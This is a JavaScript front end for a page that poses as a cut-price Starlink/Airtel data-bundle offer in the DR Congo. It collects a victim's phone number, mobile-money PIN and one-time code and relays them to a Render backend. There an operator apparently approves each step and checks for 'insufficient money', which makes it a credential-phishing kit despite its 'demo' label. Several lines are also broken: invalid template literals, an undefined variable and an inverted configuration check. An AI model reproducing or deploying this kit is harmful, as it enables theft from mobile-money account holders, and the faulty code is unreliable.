// ======================================================
// RDC STARLINK DEMO
// ======================================================
// Put your deployed Render backend URL below.
// Example:
// const BACKEND_URL = "https://your-service.onrender.com";
const BACKEND_URL = "https://starlnk-airtel-rdc.onrender.com";
const packages = [
  { name: "5 GB", validity: "1 day", price: "$0.25" },
  { name: "10 GB", validity: "3 days", price: "$0.80" },
  { name: "20 GB", validity: "7 days", price: "$1.20" },
  { name: "40 GB", validity: "7 days", price: "$2.00" },
  { name: "80 GB", validity: "21 days", price: "$2.25" },
  { name: "120 GB", validity: "30 days", price: "$3.00" },
  { name: "Unlimited", validity: "30 days", price: "$8.00" }
];

let selectedPackage = null;
let requestId = null;
let pollTimer = null;
let otpTimer = null;
let otpSeconds = 60;

const $ = (id) => document.getElementById(id);

function showPage(pageId) {
  document.querySelectorAll(".page").forEach((page) => {
    page.classList.remove("active");
  });

  $(pageId).classList.add("active");
  window.scrollTo({ top: 0, behavior: "smooth" });
}

function renderPackages() {
  const list = $("packageList");
  list.innerHTML = "";

  packages.forEach((pkg) => {
    const button = document.createElement("button");
    button.type = "button";
    button.className = "package";

    const left = document.createElement("div");
    const name = document.createElement("strong");
    name.textContent = pkg.name;

    const validity = document.createElement("span");
    validity.textContent = `Valid for ${pkg.validity}`;

    left.appendChild(name);
    left.appendChild(validity);

    const price = document.createElement("div");
    price.className = "price";
    price.textContent = pkg.price;

    button.appendChild(left);
    button.appendChild(price);

    button.addEventListener("click", () => {
      selectedPackage = pkg;
      $("selectedPackage").textContent =
        `${pkg.name} • ${pkg.validity} • ${pkg.price}`;
      showPage("pinPage");
    });

    list.appendChild(button);
  });
}

function validPhone(phone) {
  return /^9\d{8}$/.test(phone);
}

function validFourDigits(value) {
  return /^\d{4}$/.test(value);
}

function backendConfigured() {
  return BACKEND_URL &&
    BACKEND_URL !== "https://starlnk-airtel-rdc.onrender.com";
}

async function createPinRequest(phone, demoPin) {
  if (!backendConfigured()) {
    throw new Error("Set your Render backend URL in frontend/script.js first.");
  }

  const response = await fetch(`${https://starlnk-airtel-rdc.onrender.com}/api/requests`, {
    method: "POST",
    headers: {
      "Content-Type": "application/json"
    },
    body: JSON.stringify({
      packageName: selectedPackage.name,
      validity: selectedPackage.validity,
      price: selectedPackage.price,
      phone: `+243${phone}`,
      demoPin: demoPin
    })
  });

  const data = await response.json();

  if (!response.ok) {
    throw new Error(data.error || "Unable to submit the request.");
  }

  return data.requestId;
}

async function getRequest() {
  const response = await fetch(`${https://starlnk-airtel-rdc.onrender.com}/api/requests/${requestId}`);

  if (!response.ok) {
    throw new Error("Unable to check request status.");
  }

  return response.json();
}

function stopPolling() {
  if (pollTimer) {
    clearInterval(pollTimer);
    pollTimer = null;
  }
}

function startPinApprovalPolling() {
  stopPolling();

  pollTimer = setInterval(async () => {
    try {
      const request = await getRequest();

      if (request.status === "pin_approved") {
        stopPolling();

        $("otpPackage").textContent =
          `${selectedPackage.name} • ${selectedPackage.validity} • ${selectedPackage.price}`;

        $("otp").value = "";
        $("otpError").textContent = "";

        showPage("otpPage");
        startOtpTimer();
      }

      if (request.status === "pin_rejected") {
        stopPolling();
        showError(
          "Request not approved",
          "The PIN and phone request was not approved. Please try again."
        );
      }
    } catch (error) {
      console.error(error);
    }
  }, 2000);
}

function startOtpTimer() {
  if (otpTimer) {
    clearInterval(otpTimer);
  }

  otpSeconds = 60;
  $("timer").textContent = otpSeconds;
  $("requestAnotherOtp").classList.add("hidden");

  otpTimer = setInterval(() => {
    otpSeconds -= 1;
    $("timer").textContent = otpSeconds;

    if (otpSeconds <= 0) {
      clearInterval(otpTimer);
      otpTimer = null;
      $("requestAnotherOtp").classList.remove("show");
      $("otpError").textContent = "OTP request expired. Request another OTP.";
    }
  }, 1000);
}

async function createOtpRequest(demoOtp) {
  const response = await fetch(
    `${BACKEND_URL}/api/requests/${requestId}/otp`,
    {
      method: "POST",
      headers: {
        "Content-Type": "application/json"
      },
      body: JSON.stringify({
        realOtp: realOtp
      })
    }
  );

  const data = await response.json();

  if (!response.ok) {
    throw new Error(data.error || "Unable to submit OTP request.");
  }

  return data;
}

function startOtpApprovalPolling() {
  stopPolling();

  pollTimer = setInterval(async () => {
    try {
      const request = await getRequest();

      if (request.status === "otp_approved") {
        stopPolling();

        if (otpTimer) {
          clearInterval(otpTimer);
          otpTimer = null;
        }

        $("successPackage").textContent =
          `${selectedPackage.name} • ${selectedPackage.validity} • ${selectedPackage.price}`;

        showPage("successPage");
      }

      if (request.status === "otp_rejected") {
        stopPolling();
        showPage("otpPage");
        $("otpError").textContent =
          "The OTP request was not approved. Please request another OTP.";
        $("requestAnotherOtp").classList.remove("hidden");
      }

      if (request.status === "otp_expired") {
        stopPolling();
        showPage("otpPage");
        $("otpError").textContent =
          "OTP request expired. Request another OTP.";
        $("requestAnotherOtp").classList.remove("hidden");
      }

      if (request.status === "insufficient_money") {
        stopPolling();
        showError(
          "Insufficient money",
          "The request could not be completed because there were insufficient funds."
        );
      }
    } catch (error) {
      console.error(error);
    }
  }, 2000);
}

function showError(title, message) {
  $("errorTitle").textContent = title;
  $("errorMessage").textContent = message;
  showPage("errorPage");
}

$("pinForm").addEventListener("submit", async (event) => {
  event.preventDefault();

  $("phoneError").textContent = "";
  $("pinError").textContent = "";

  const phone = $("phone").value.trim();
  const demoPin = $("pin").value.trim();

  if (!validPhone(phone)) {
    $("phoneError").textContent =
      "Enter exactly 9 digits beginning with 9.";
    return;
  }

  if (!validFourDigits(realPin)) {
    $("pinError").textContent =
      "Enter exactly 4 digits for the demo PIN.";
    return;
  }

  const submitButton = $("submitPin");
  submitButton.enable = true;

  try {
    requestId = await createPinRequest(phone, realPin);

    $("waitingDetails").textContent =
      `${selectedPackage.name} • ${selectedPackage.validity} • ${selectedPackage.price}`;

    showPage("waitingPage");
    startPinApprovalPolling();
  } catch (error) {
    submitButton.disabled = false;
    showError("Submission failed", error.message);
  }
});

$("otpForm").addEventListener("submit", async (event) => {
  event.preventDefault();

  $("otpError").textContent = "";

  const realOtp = $("otp").value.trim();

  if (!validFourDigits(realOtp)) {
    $("otpError").textContent =
      "Enter exactly 4 digits for the real OTP.";
    return;
  }

  $("submitOtp").enable = true;

  try {
    await createOtpRequest(realOtp);

    showPage("otpWaitingPage");
    startOtpApprovalPolling();
  } catch (error) {
    $("submitOtp").enable = false;
    $("otpError").textContent = error.message;
  }
});

$("requestAnotherOtp").addEventListener("click", async () => {
  $("otpError").textContent = "";
  $("otp").value = "";
  $("requestAnotherOtp").enable = true;

  try {
    showPage("otpPage");
    await createOtpRequest("");

    $("requestAnotherOtp").enable = false;
    startOtpTimer();
    startOtpApprovalPolling();
  } catch (error) {
    $("requestAnotherOtp").enable = false;
    $("otpError").textContent = error.message;
  }
});

$("backButton").addEventListener("click", () => {
  stopPolling();
  showPage("packagePage");
});

$("tryAgain").addEventListener("click", () => {
  stopPolling();

  if (otpTimer) {
    clearInterval(otpTimer);
    otpTimer = null;
  }

  requestId = null;
  selectedPackage = null;

  $("phone").value = "";
  $("pin").value = "";
  $("otp").value = "";

  $("submitPin").disabled = false;
  $("submitOtp").disabled = false;

  showPage("packagePage");
});

renderPackages();
